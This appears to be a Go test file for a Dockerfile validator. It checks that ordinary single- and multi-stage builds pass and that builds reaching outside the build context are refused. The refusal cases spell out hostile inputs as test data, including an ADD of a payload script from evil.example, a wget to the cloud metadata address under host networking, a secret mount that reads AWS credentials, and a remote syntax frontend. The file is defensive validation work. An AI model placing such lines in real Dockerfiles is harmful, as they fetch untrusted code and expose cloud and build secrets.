package dockerfile

import (
	"errors"
	"strings"
	"testing"
)

const (
	python = "docker.io/library/python:3.13-alpine@sha256:9ef1a599f863231c3d91e941389bfdc4a2d6070557243d54df1a4e57015b960e"
	golang = "docker.io/library/golang:1.26-alpine@sha256:" + "1111111111111111111111111111111111111111111111111111111111111111"
)

var bases = []string{python, golang}

func TestCheckAllowsOrdinaryDockerfiles(t *testing.T) {
	ok := map[string]string{
		"single stage": "FROM " + python + "\nWORKDIR /srv\nCOPY app.py .\nUSER 65532\nENTRYPOINT [\"python\", \"/srv/app.py\"]\n",
		"multi stage": "# build then copy\nFROM " + golang + " AS build\nWORKDIR /src\nCOPY . .\n" +
			"RUN --mount=type=cache,target=/root/.cache CGO_ENABLED=0 go build -o /app .\n" +
			"FROM scratch\nCOPY --from=build /app /app\nCOPY --from=0 /etc/passwd /etc/passwd\nENTRYPOINT [\"/app\"]\n",
		"stage used as a base":        "FROM " + python + " AS base\nRUN true\nFROM base\nCOPY app.py .\n",
		"lower-case keywords":         "from " + python + "\nrun true\n",
		"comment that looks like one": "FROM " + python + "\n# syntax=this is only a comment after the first instruction\nRUN true\n",
		"continued RUN":               "FROM " + python + "\nRUN echo one && \\\n    # a comment in the middle\n    echo two\n",
		"local ADD":                   "FROM " + python + "\nADD vendor.tar.gz /opt/\n",
	}
	for name, content := range ok {
		if err := Check([]byte(content), bases); err != nil {
			t.Errorf("%s: refused: %v", name, err)
		}
	}
}

func TestCheckRefusesWhatReachesOutsideTheBuild(t *testing.T) {
	bad := map[string]struct{ content, want string }{
		"a base image that is not listed":         {"FROM docker.io/library/alpine:latest\n", "not in the run spec's list"},
		"a listed image by tag instead of digest": {"FROM docker.io/library/python:3.13-alpine\n", "not in the run spec's list"},
		"a private registry":                      {"FROM registry.internal.example/base@sha256:" + strings.Repeat("2", 64) + "\n", "not in the run spec's list"},
		"a second stage from elsewhere":           {"FROM " + python + " AS a\nFROM evil.example/x\nCOPY --from=a / /\n", "not in the run spec's list"},
		"a syntax directive":                      {"# syntax=evil.example/frontend:latest\nFROM " + python + "\n", `parser directive "syntax"`},
		"an escape directive":                     {"# escape=`\nFROM " + python + "\n", `parser directive "escape"`},
		"a directive after a blank line":          {"\n#syntax = evil.example/frontend\nFROM " + python + "\n", "parser directive"},
		"a base image from a variable":            {"ARG BASE=evil.example/x\nFROM ${BASE}\n", "uses a variable"},
		"a platform flag from a variable":         {"ARG P=linux/amd64\nFROM --platform=$P " + python + "\n", "uses a variable"},
		"a base image hidden by a continuation":   {"FROM \\\n  evil.example/x\n", "not in the run spec's list"},
		"lower-case from":                         {"from evil.example/x\n", "not in the run spec's list"},
		"COPY from another image":                 {"FROM " + python + "\nCOPY --from=evil.example/tools /bin/x /bin/x\n", "from outside this build"},
		"COPY from a later stage index":           {"FROM " + python + "\nCOPY --from=3 /x /x\n", "from outside this build"},
		"ADD of a URL":                            {"FROM " + python + "\nADD https://evil.example/payload.sh /run.sh\n", "from the network"},
		"ADD of a git repository":                 {"FROM " + python + "\nADD git@github.com:evil/repo.git /src\n", "from the network"},
		"RUN with host networking":                {"FROM " + python + "\nRUN --network=host wget http://169.254.169.254/\n", "--network=host"},
		"RUN with relaxed security":               {"FROM " + python + "\nRUN --security=insecure true\n", "--security=insecure"},
		"RUN with a secret mount":                 {"FROM " + python + "\nRUN --mount=type=secret,id=aws cat /run/secrets/aws\n", `mount type "secret"`},
		"RUN with an ssh mount":                   {"FROM " + python + "\nRUN --mount=type=ssh git clone git@github.com:x/y\n", `mount type "ssh"`},
		"RUN with a mount from another image":     {"FROM " + python + "\nRUN --mount=type=bind,from=evil.example/x,target=/x true\n", "from outside this build"},
		"ONBUILD hiding an ADD":                   {"FROM " + python + "\nONBUILD ADD https://evil.example/x /x\n", "from the network"},
		"no FROM at all":                          {"RUN true\n", "no FROM"},
		"an empty file":                           {"", "no FROM"},
	}
	for name, tt := range bad {
		err := Check([]byte(tt.content), bases)
		if !errors.Is(err, ErrRefused) {
			t.Errorf("%s: err = %v, want ErrRefused", name, err)
			continue
		}
		if !strings.Contains(err.Error(), tt.want) {
			t.Errorf("%s: err = %q, want it to mention %q", name, err, tt.want)
		}
	}
}

func TestScratchNeedsNoListing(t *testing.T) {
	if err := Check([]byte("FROM scratch\nCOPY app /app\n"), nil); err != nil {
		t.Errorf("FROM scratch was refused: %v", err)
	}
}
